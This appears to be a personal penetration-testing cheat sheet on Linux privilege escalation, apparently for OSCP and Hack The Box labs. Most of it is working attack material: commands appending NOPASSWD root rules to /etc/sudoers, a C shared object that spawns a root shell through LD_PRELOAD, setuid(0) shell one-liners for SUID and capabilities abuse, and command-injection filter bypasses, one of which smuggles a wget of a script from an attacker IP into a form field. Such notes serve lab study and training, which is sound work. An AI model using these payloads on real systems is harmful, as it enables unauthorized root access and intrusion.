---
description: watch pspy
---

# Linux Privesc

{% embed url="https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md" %}

### Web Reverse Shell&#x20;

* App config file
* Server access (.htaccess, 000-default.conf)
* Git server
* Scripts that can run as elevated user - cronjob, path injection
* Docker container

Expose creds for valid user in system or privesc and generate SSH keys

#### Does your reverse shell always hang instantly?

* Use another payload duh
* Encode command and execute
* The `nohup` command in Linux ensures that a process continues running even after the terminal is closed or the user logs out.

{% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" %}

```bash
bash -c '[revshell payload]' #The single quotes make a big difference
```

{% code title="Upgrade Reverse Shell" %}
```bash
TTY Shells
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
Ctrl-Z

TTY Stabilization
# In Kali
echo $TERM 
stty -a

stty raw -echo; fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color [matching same TERM as that of our kali shell]
stty rows <num> columns <cols> [get values from stty -a]

SOCAT
sudo apt install rlwrap
rlwrap nc -lvnp <port>
```
{% endcode %}

<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt="" width="419"><figcaption></figcaption></figure></div>

## Checklist

* Kernel and distribution release details
* Can you:
  * Read ENV variables `/proc/self/environ & /proc/self/cmdline` &#x20;
  * Add to sudoers
  * Copy file, change ownership, symlink
  * Revshell
* System Information:
  * Hostname
  * Networking details:
  * Current IP
  * Default route details
  * DNS server information
* User Information:
  * Current user details
  * Last logged on users
  * Shows users logged onto the host
  * List all users including uid/gid information
  * List root accounts
  * Extracts password policies and hash storage method information
  * Checks umask value
  * Checks if password hashes are stored in /etc/passwd
  * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
  * Attempt to read restricted files i.e. /etc/shadow
  * List current users history files (i.e .bash\_history, .nano\_history, .mysql\_history , etc.)
  * Basic SSH checks
* Privileged access:
  * Which users have recently used sudo
  * Determine if /etc/sudoers is accessible
  * Determine if the current user has Sudo access without a password
  * Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
  * Is root's home directory accessible
  * List permissions for /home/
* Environmental:
  * Display current $PATH
  * Displays env information
* Jobs/Tasks:
  * List all cron jobs
  * Locate all world-writable cron jobs
  * Locate cron jobs owned by other users of the system
  * List the active and inactive systemd timers
* Services:
  * List network connections (TCP & UDP)
  * List running processes
  * Lookup and list process binaries and associated permissions
  * List inetd.conf/xined.conf contents and associated binary file permissions
  * List init.d binary permissions
* Version Information (of the following):
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * Checks user config
    * Shows enabled modules
    * Checks for htpasswd files
    * View www directories
* Default/Weak Credentials:
  * Checks for default/weak Postgres accounts
  * Checks for default/weak MYSQL accounts
* Searches:
  * Locate all SUID/GUID files
  * Locate all world-writable SUID/GUID files
  * Locate all SUID/GUID files owned by root
  * Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
  * Locate files with POSIX capabilities
  * List all world-writable files
  * Find/list all accessible \*.plan files and display contents
  * Find/list all accessible \*.rhosts files and display contents
  * Show NFS server details
  * Locate \*.conf and \*.log files containing keyword supplied at script runtime
  * List all \*.conf files located in /etc
  * Locate mail

### Sudo and SUID

#### SUDO

Run a file as another user entirely

#### Add User to sudoers

```
echo “[user] ALL=(ALL) NOPASSWD: ALL” >> /etc/sudoers
echo "alice ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```

If `LD_PRELOAD` is explicitly defined in the sudoers file

```
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with \
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD\_PRELOAD to spawn a shell : \
`sudo LD_PRELOAD=<full_path_to_so_file> <program>`\
e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

#### SUID

Run a file with the file permissions of the owner itself

```bash
find / -perm -g=s -type f 2>/dev/null    # SGID
find / -perm -u=s -type f 2>/dev/null    # SUID
```

#### Find SUID files <a href="#find-suid-root-files" id="find-suid-root-files"></a>

```bash
find / perm /u=s -user "[user]" 2>/dev/null 
find / -[group/user] [user] -ls 2>/dev/null
find / -user [user] -perm -4000 -print  2>/dev/null
find / -group [user] -perm -2000 -print 2>/dev/null
```

#### Find SUID and SGID files owned by anyone: <a href="#find-suid-and-sgid-files-owned-by-anyone" id="find-suid-and-sgid-files-owned-by-anyone"></a>

```bash
find / -perm -4000 -o -perm -2000 -print  2>/dev/null
```

#### Execute SUID via Python

```python
import os
os.setuid(0)
os.system("/bin/bash -p")
```

### Capabilities

More complex privilege control, run only specified actions with elevated privilege

```bash
/usr/bin/getcap -r / 2>/dev/null        # list all 
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Command Injection <a href="#kernel" id="kernel"></a>

{% hint style="info" %}
OS Injection under Web Servers & Languages
{% endhint %}

`;` ends a command and `#` comments out the rest of an existing one\
`&` may have to be URL encoded in web payloads

Any website/interface that provides an input might be running a command with the input as a parameter, think carefully

{% code title="Bypass Character Filters" %}
```
${IFS} - Internal Field Separator, default variable in bash [Alternative to whitespace]

#Curly brace expansion
0xdf;{ping,-c,1,10.10.14.23};#
0xdf;ping -c 1 10.10.14.23;#

\r\n -> EOL, similar function to ';'
%0d : \r [Carriage return]
%0a : \n
%09 : \t

#Quotes was also not URL encoded
password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
```
{% endcode %}

### Binary Tracing <a href="#kernel" id="kernel"></a>

```bash
strace -f [bin] [follows forks too, see the exec calls]
ltrace [bin] also works lowk
```

### PATH <a href="#kernel" id="kernel"></a>

When the exact path of a binary is not called, prepend our's and it gets called first

```bash
echo $PATH
export PATH=<PATH/TO/FOLDER>:$PATH
#BInary to be called is placed and this path will be looked first
```

### Symlink

Any operations involving backup/zip/file handling as sudo

```bash
ln -s [target_file] [source_file]
#ln -s [/root/.ssh/authorized_keys] [random_file] -> this file points towards SSH key
```

### Crontab <a href="#kernel" id="kernel"></a>

Jobs running at particular intervals

```bash
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

### Kernel <a href="#kernel" id="kernel"></a>

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

{% embed url="https://github.com/jondonas/linux-exploit-suggester-2" %}

```bash
cat /proc/version
uname -a
uname -ar
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

{% embed url="https://guif.re/linuxeop" %}

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------" %}
READDDD from HTB Usage
{% endembed %}

{% embed url="https://t0o0tz.com/posts/post0x0004/" %}
